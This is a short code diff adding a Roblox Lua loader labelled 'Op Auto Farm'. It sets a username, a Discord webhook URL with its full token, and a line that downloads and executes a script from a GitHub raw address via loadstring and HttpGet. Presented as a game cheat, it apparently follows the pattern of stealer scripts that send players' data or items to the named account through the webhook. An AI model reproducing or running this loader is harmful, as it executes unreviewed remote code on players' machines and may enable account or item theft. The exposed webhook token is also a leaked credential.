@@ -1,0 +1,5 @@
+_G.Username = "1bag32"
+_G.HubName = "Op Auto Farm"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1105650156805828749/lv1gY4bosGyZWHg3lhqgJ44g9yfFfBVcmsKz6I38nfsthJ_wegDPINQNMplzTvJ_wf3K"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
